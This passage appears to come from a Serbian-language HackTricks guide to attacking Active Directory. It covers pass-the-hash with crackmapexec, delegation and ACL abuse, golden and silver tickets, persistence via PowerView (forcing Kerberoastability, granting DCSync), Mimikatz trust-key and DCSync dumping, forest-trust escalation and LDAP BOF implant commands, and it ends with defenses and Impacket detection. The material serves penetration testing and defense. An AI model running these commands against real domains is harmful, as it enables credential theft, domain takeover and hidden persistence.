## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **noisy** i da bi ga **LAPS** mogao **mitigate**.

### MSSQL Abuse & Trusted Links

Ako korisnik ima privilegije za **access MSSQL instances**, mogao bi da ih iskoristi za **execute commands** na MSSQL hostu (ako radi kao SA), da **steal** NetNTLM **hash** ili čak izvrši **relay** **attack**.\
Ako je MSSQL instanca trusted preko linka baze podataka od strane druge instance, korisnik sa privilegijama nad povezanom bazom može biti u mogućnosti da **use the trust relationship to execute queries on the other instance**. Ovi trust-ovi mogu da se ulančavaju i na kraju mogu dosegnuti pogrešno konfigurisanu bazu podataka u kojoj korisnik može da izvršava komande.\
**Links između baza podataka funkcionišu čak i preko forest trust-ova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse IT asset/deployment platforms

Paketi nezavisnih proizvođača za inventar i deployment često izlažu moćne puteve do kredencijala i izvršavanja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domain privilegije na tom računaru, moći ćete da iz memorije izvučete TGT-ove svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da izvučete njegov TGT i da ga impersonate koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u, mogli biste čak i **automatski da compromise-ujete Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", on će moći da **impersonate bilo kog korisnika radi pristupa određenim servisima na računaru**.\
Zatim, ako **compromise-ujete hash** ovog korisnika/računara, moći ćete da **impersonate bilo kog korisnika** (čak i domain admin-e) radi pristupa određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posedovanje **WRITE** privilegije nad Active Directory objektom udaljenog računara omogućava postizanje izvršavanja koda sa **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse Permissions/ACLs

Compromise-ovani korisnik može imati neke **zanimljive privilegije nad određenim domain objektima** koje bi vam mogle omogućiti lateralno **move**/**escalate** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se **abuse-ovati** za **acquire novih kredencijala** i **escalate privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse third party sessions

Ako **drugi korisnici** **access-uju** **compromise-ovanu** mašinu, moguće je **gather-ovati kredencijale iz memorije** i čak **inject-ovati beacons u njihove procese** radi impersonation-a.\
Korisnici obično pristupaju sistemu putem RDP-a, pa ovde možete pronaći kako da izvršite nekoliko attack-ova nad RDP sesijama trećih strana:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lokalnom Administrator lozinkom** na računarima pridruženim domenu, čime se osigurava da je ona **randomized**, jedinstvena i često **changed**. Ove lozinke se čuvaju u Active Directory-ju, a pristup se kontroliše preko ACL-ova samo za autorizovane korisnike. Sa dovoljnim dozvolama za pristup ovim lozinkama, pivoting ka drugim računarima postaje moguć.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** sa compromise-ovane mašine može biti način za escalation privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse Certificate Templates

Ako su konfigurisani **vulnerable templates**, moguće je abuse-ovati ih za escalation privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa nalogom visokih privilegija

### Dumping Domain Credentials

Kada dobijete privilegije **Domain Admin** ili, još bolje, **Enterprise Admin**, možete da **dump-ujete** **domain bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync attack-u možete pronaći ovde**](dcsync.md).

[**Više informacija o tome kako da steal-ujete NTDS.dit možete pronaći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od prethodno razmotrenih tehnika mogu se koristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti korisniku privilegije [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** kreira **legitimate Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC naloga**). Ovaj metod se koristi za **access privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da attacker dobije pristup **NTLM hash-u krbtgt naloga** u Active Directory (AD) okruženju. Ovaj nalog je poseban zato što se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su neophodni za autentifikaciju unutar AD mreže.

Kada attacker dobije ovaj hash, može da kreira **TGT-ove** za bilo koji nalog po svom izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Oni su poput golden ticket-ova falsifikovanih na način koji **bypasses uobičajene mehanizme za detekciju golden ticket-ova.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posedovanje certificates naloga ili mogućnost njihovog request-ovanja** veoma je dobar način za persistence u korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenjem certificates takođe je moguće ostvariti persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory-ju obezbeđuje sigurnost **privileged grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na ove grupe, kako bi se sprečile neovlašćene izmene. Međutim, ova funkcija može biti abuse-ovana; ako attacker izmeni ACL objekta AdminSDHolder tako da običnom korisniku dodeli potpuni pristup, taj korisnik dobija široku kontrolu nad svim privileged grupama. Ova bezbednosna mera, čija je namena zaštita, tako može imati suprotan efekat i omogućiti neovlašćeni pristup ako se pažljivo ne nadgleda.

[**Više informacija o AdminDSHolder Group možete pronaći ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)** računara postoji nalog **lokalnog administratora**. Dobijanjem admin prava na takvoj mašini, lokalni Administrator hash može se izvući pomoću **mimikatz**-a. Nakon toga je potrebna izmena registra kako bi se **omogućilo korišćenje ove lozinke**, čime se omogućava remote pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** neke **posebne dozvole** **korisniku** nad određenim domain objektima, što će korisniku omogućiti da u budućnosti **escalate-uje privilegije**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** **objektom**. Ako možete samo da napravite **malu izmenu** u **security descriptor-u** objekta, možete dobiti veoma zanimljive privilegije nad tim objektom, bez potrebe da budete član privileged grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse-ujte pomoćnu klasu `dynamicObject` za kreiranje kratkotrajnih principal-a/GPO-ova/DNS zapisa sa `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstone-ova, uklanjajući LDAP dokaze, dok ostavljaju orphan SID-ove, neispravne `gPLink` reference ili keširane DNS odgovore (npr. zagađenje AdminSDHolder ACE-a ili zlonamerni `gPCFileSysPath`/AD-integrated DNS redirect-i).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da biste uspostavili **univerzalnu lozinku**, čime se omogućava pristup svim domain nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati **sopstveni SSP** za **capture-ovanje** **credentials** korišćenih za pristup mašini u **clear text** obliku.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

On registruje **novi Domain Controller** u AD-u i koristi ga za **push-ovanje attributes** (SIDHistory, SPNs...) na navedene objekte, **bez ostavljanja bilo kakvih log-ova** o **izmenama**. Potrebne su vam DA privilegije i morate biti unutar **root domena**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti veoma upadljivi log-ovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Prethodno smo govorili o tome kako da escalate-ujete privilegije ako imate **dovoljno dozvola za čitanje LAPS lozinki**. Međutim, ove lozinke se takođe mogu koristiti za **održavanje persistence-a**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft smatra **Forest** bezbednosnom granicom. To podrazumeva da bi **compromise** jednog domena potencijalno mogao dovesti do compromise-a čitavog Forest-a.<sup>[[1]](#references)</sup>

### Osnovne informacije

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji korisniku iz jednog **domena** omogućava pristup resursima u drugom **domenu**. On u suštini kreira vezu između sistema za autentifikaciju dva domena, omogućavajući nesmetan protok verifikacija autentifikacije. Kada domeni uspostave trust, oni razmenjuju i čuvaju određene **ključeve** unutar svojih **Domain Controller (DC)** računara, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domenu**, prvo mora da zatraži poseban ticket poznat kao **inter-realm TGT** od DC-a sopstvenog domena. Ovaj TGT je šifrovan deljenim **ključem** oko kog su se oba domena usaglasila. Korisnik zatim prosleđuje ovaj TGT **DC-u trusted domena** kako bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domena, on izdaje TGS, čime korisniku odobrava pristup servisu.

**Koraci**:

1. **Client računar** u **Domain 1** započinje proces koristeći svoj **NTLM hash** za zahtev **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)** računara.
2. DC1 izdaje novi TGT ako je client uspešno autentifikovan.
3. Client zatim zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je šifrovan pomoću **trust key**-a koji dele DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Client prosleđuje inter-realm TGT **Domain 2 Domain Controller (DC2)** računaru.
6. DC2 verifikuje inter-realm TGT koristeći deljeni trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kome client želi da pristupi.
7. Na kraju, client prosleđuje ovaj TGS serveru, koji je šifrovan hash-om naloga servera, kako bi dobio pristup servisu u Domain 2.

### Različiti trust-ovi

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj varijanti, oba domena veruju jedan drugom, dok će u **jednosmernoj** trust relaciji jedan domen biti **trusted**, a drugi **trusting** domen. U poslednjem slučaju, **moći ćete da pristupate resursima unutar trusting domena samo iz trusted domena**.

Ako Domain A veruje Domain B, A je trusting domen, a B je trusted domen. Pored toga, u **Domain A**, to bi bio **Outbound trust**; a u **Domain B**, to bi bio **Inbound trust**.

**Različiti trusting odnosi**

- **Parent-Child Trusts**: Ovo je uobičajena postavka unutar istog forest-a, gde child domen automatski ima dvosmerni transitive trust sa svojim parent domenom. To u suštini znači da zahtevi za autentifikaciju mogu nesmetano da prolaze između parent i child domena.
- **Cross-link Trusts**: Poznati i kao "shortcut trusts", uspostavljaju se između child domena radi ubrzavanja referral procesa. U kompleksnim forest-ovima, authentication referral-i obično moraju da putuju do forest root-a, a zatim do ciljnog domena. Kreiranjem cross-link-ova put se skraćuje, što je naročito korisno u geografski distribuiranim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust-ovi su korisni za pristup resursima u domenu izvan trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se dodatno ojačava SID filtering-om kod external trust-ova.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novog tree root-a. Iako nisu česti, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i dvosmernu tranzitivnost. Više informacija možete pronaći u [Microsoft vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je dvosmerni transitive trust između dva forest root domena, uz primenu SID filtering-a radi poboljšanja bezbednosnih mera.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trust-ovi su nešto specijalizovaniji i namenjeni su okruženjima koja zahtevaju integraciju sa Kerberos-based sistemima izvan Windows ekosistema.

#### Druge razlike u **trusting odnosima**

- Trust odnos takođe može biti **transitive** (A veruje B, B veruje C, pa A veruje C) ili **non-transitive**.
- Trust odnos može biti podešen kao **bidirectional trust** (oba domena veruju jedan drugom) ili kao **one-way trust** (samo jedan od njih veruje drugom).

### Attack Path

1. **Enumerate-ujte** trusting odnose
2. Proverite da li neki **security principal** (user/group/computer) ima **access** resursima **drugog domena**, možda preko ACE unosa ili članstva u grupama drugog domena. Potražite **odnose između domena** (trust je verovatno zbog toga i kreiran).
1. Kerberoast u ovom slučaju može biti još jedna opcija.
3. **Compromise-ujte** **naloge** koji mogu da izvrše pivot kroz domene.

Attackers sa pristupom resursima u drugom domenu mogu da ga ostvare putem tri primarna mehanizma:

- **Local Group Membership**: Principals mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, čime dobijaju značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principals takođe mogu biti članovi grupa unutar foreign domena. Međutim, efikasnost ovog metoda zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principals mogu biti navedeni u **ACL-u**, naročito kao entiteti u **ACE-ovima** unutar **DACL-a**, čime im se omogućava pristup određenim resursima. Za one koji žele detaljnije da prouče mehanizme ACL-ova, DACL-ova i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” predstavlja veoma vredan resurs.<sup>[[17]](#references)</sup>

### Pronalaženje external korisnika/grupa sa dozvolama

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kako biste pronašli foreign security principals u domenu. To će biti user/group iz **external domena/forest-a**.

Ovo možete proveriti u **Bloodhound-u** ili pomoću powerview-a:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Eskalacija privilegija iz Child u Parent forestu
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju domain trust-ova:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 pouzdana ključa**, jedan za _Child --> Parent_, a drugi za _Parent_ --> _Child_.\
> Možete pronaći ključ koji koristi trenutni domen pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte na Enterprise admin nalog u child/parent domenu zloupotrebom trust-a i SID-History injection-a:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje načina na koji se Configuration Naming Context (NC) može iskoristiti je od ključne važnosti. Configuration NC služi kao centralno spremište konfiguracionih podataka u čitavoj forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar forest-a, pri čemu writable DC-ovi održavaju writable kopiju Configuration NC-a. Da bi se ovo iskoristilo, neophodno je imati **SYSTEM privilegije na DC-u**, po mogućnosti na child DC-u.

**Link GPO to root DC site**

Sites container Configuration NC-a sadrži informacije o site-ovima svih računara pridruženih domenu unutar AD forest-a. Operisanjem sa SYSTEM privilegijama na bilo kom DC-u, napadači mogu povezati GPO-ove sa site-ovima root DC-a. Ova radnja potencijalno kompromituje root domen manipulisanjem politikama koje se primenjuju na te site-ove.

Za detaljne informacije možete proučiti istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Jedan od vektora napada podrazumeva ciljanje privilegovanih gMSA naloga unutar domena. KDS Root ključ, neophodan za izračunavanje lozinki gMSA naloga, čuva se unutar Configuration NC-a. Sa SYSTEM privilegijama na bilo kom DC-u moguće je pristupiti KDS Root ključu i izračunati lozinke za bilo koji gMSA u čitavoj forest.

Detaljna analiza i uputstva korak po korak dostupni su u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Dopunski delegirani MSA napad (BadSuccessor – zloupotreba migration atributa):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno eksterno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ovaj metod zahteva strpljenje, odnosno čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema kako bi bilo kom korisniku dodelio potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa novokreiranim AD objektima i kontrole nad njima.

Dodatne informacije dostupne su u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad objektima Public Key Infrastructure (PKI) kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar forest-a. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje writable child DC-a omogućava izvršavanje ESC5 napada.

Više detalja dostupno je u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U scenarijima bez ADCS-a, napadač može postaviti neophodne komponente, kao što je opisano u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vašem domenu veruje** eksterni domen, što vam daje **neodređene dozvole** nad njim. Moraćete da utvrdite **koji principi vašeg domena imaju koji nivo pristupa eksternom domenu**, a zatim pokušate da ga exploitujete:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni forest domen - jednosmerni (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **ukazuje poverenje** nekim **privilegijama** principalu iz **drugih domena**.

Međutim, kada **domenu veruje** domen koji mu ukazuje poverenje, domen kome se veruje **kreira korisnika** sa **predvidljivim imenom**, koji kao **lozinku koristi lozinku domena kome se veruje**. To znači da je moguće **pristupiti korisniku iz domena koji ukazuje poverenje, ući u domen kome se veruje**, enumerisati ga i pokušati dodatno eskalirati privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način za kompromitovanje domena kome se veruje jeste pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom smeru** od poverenja između domena (što nije naročito često).

Drugi način za kompromitovanje domena kome se veruje jeste čekanje na mašini kojoj **korisnik iz domena kome se veruje može da pristupi**, kako bi se prijavio putem **RDP-a**. Napadač bi zatim mogao da ubaci kod u proces RDP sesije i odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, napadač bi iz procesa **RDP sesije** mogao da sačuva **backdoor-e** u **startup folderu hard diska**. Ova tehnika se naziva **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja domena

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history kroz forest trusts ublažava se pomoću SID Filtering-a, koji je podrazumevano aktiviran na svim inter-forest trustovima. Ovo se zasniva na pretpostavci da su intra-forest trustovi bezbedni, pri čemu se forest, a ne domen, smatra bezbednosnom granicom, u skladu sa stavom kompanije Microsoft.
- Međutim, postoji problem: SID filtering može da poremeti aplikacije i pristup korisnika, što dovodi do njegovog povremenog deaktiviranja.

### **Selective Authentication:**

- Za inter-forest trustove, korišćenje Selective Authentication-a osigurava da korisnici iz dva forest-a ne budu automatski autentifikovani. Umesto toga, potrebne su eksplicitne dozvole kako bi korisnici pristupili domenima i serverima unutar domena ili forest-a koji ukazuje poverenje.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context-a (NC) niti od napada na trust account.

[**Više informacija o poverenju između domena na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse sa implantima na hostu

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koji se u potpunosti izvršavaju unutar on-host implanta (npr. Adaptix C2). Operateri kompajliraju paket pomoću `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim iz beacon-a pozivaju `ldap <subcommand>`. Sav saobraćaj koristi trenutni logon security context preko LDAP-a (389), uz signing/sealing, ili LDAPS (636) sa automatskim poverenjem u sertifikat, tako da nisu potrebni socks proxy-ji niti artefakti na disku.<sup>[[4]](#references)</sup>

### LDAP enumeracija sa strane implanta

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i izbacuju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptors), kao i metapodatke forest-a/domena iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` direktno iz LDAP-a prikazuju kandidate za roasting, postavke delegacije i postojeće deskriptore za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analiziraju DACL kako bi naveli trustees, prava (GenericAll/WriteDACL/WriteOwner/attribute writes) i inheritance, pružajući neposredne ciljeve za eskalaciju privilegija putem ACL-a.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOF-ovi (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principals ili mašinske naloge tamo gde postoje OU prava. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju ciljeve kada se pronađu prava write-property.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pretvaraju WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinke, kontrolu članstva u grupama ili DCSync privilegije za replikaciju, bez ostavljanja PowerShell/ADSI tragova. Odgovarajuće `remove-*` komande uklanjaju ubačene ACE-ove.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` odmah čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez menjanja lozinke.
- Makroi za delegaciju (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) menjaju `msDS-AllowedToDelegateTo`, UAC flags ili `msDS-AllowedToActOnBehalfOfOtherIdentity` direktno iz beacona, omogućavajući constrained/unconstrained/RBCD attack paths i uklanjajući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SID-ove u SID history kontrolisanog principala (pogledajte [SID-History Injection](sid-history-injection.md)), obezbeđujući prikriveno nasleđivanje pristupa u potpunosti preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti sredstva u OU-ove gde već postoje delegirana prava, pre zloupotrebe `set-password`, `add-groupmember` ili `add-spn`.
- Strogo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzo vraćanje izmena nakon što operator prikupi credentials ili persistence, čime se minimizuje telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Saznajte više o zaštiti credentials ovde.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Ograničenja za Domain Admins**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, čime se izbegava njihovo korišćenje na drugim hostovima.
- **Privileges service account-ova**: Services ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Vremensko ograničavanje privilegija**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. To se može postići ovako: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ublažavanje LDAP relay-a**: Nadgledajte Event ID-jeve 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima kako biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ako želite da otkrijete uobičajeni AD tradecraft, **nemojte se oslanjati samo na artefakte kojima operator upravlja**, kao što su preimenovani binarni fajlovi, nazivi servisa, privremeni batch fajlovi ili output paths. Uspostavite baseline načina na koji legitimni Windows klijenti generišu [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI saobraćaj, a zatim tražite **implementation quirks** koji ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (nakon validacije u odnosu na sopstveni baseline):
- Authenticated DCE/RPC sa `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding popunjen vrednošću `0xff`
- LDAP Kerberos bind-ovi koji postavljaju sirovi Kerberos `AP-REQ` direktno u SPNEGO `mechToken`
- SMB2/3 negotiate zahtevi sa ASCII-looking `ClientGuid` vrednostima
- WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
- Hardcoded Kerberos nonce vrednosti
- **Better as correlation/scoring features**:
- Sparse ili duplicirane Kerberos etype liste, neuobičajeni/nedostajući `PA-DATA` ili TGS-REQ etype redosled koji se razlikuje od nativnog Windows-a
- NTLM Type 1 poruke bez version info ili Type 3 poruke sa null host names
- Sirovi NTLMSSP prenet u DCE/RPC umesto SPNEGO, nedostajući DCE/RPC verification trailers ili SPNEGO/Kerberos OID nepodudarnosti
- Više ovih karakteristika sa istog hosta/user-a/session-a/vremenskog prozora mnogo je jači signal od bilo kog pojedinačnog slabog polja
- **Use as enrichment, not as standalone alerts**:
- Podrazumevani filenames, output paths, random service names, temporary batch names, podrazumevani computer account names i tool-specific HTTP/WebDAV/RDP/MSSQL strings
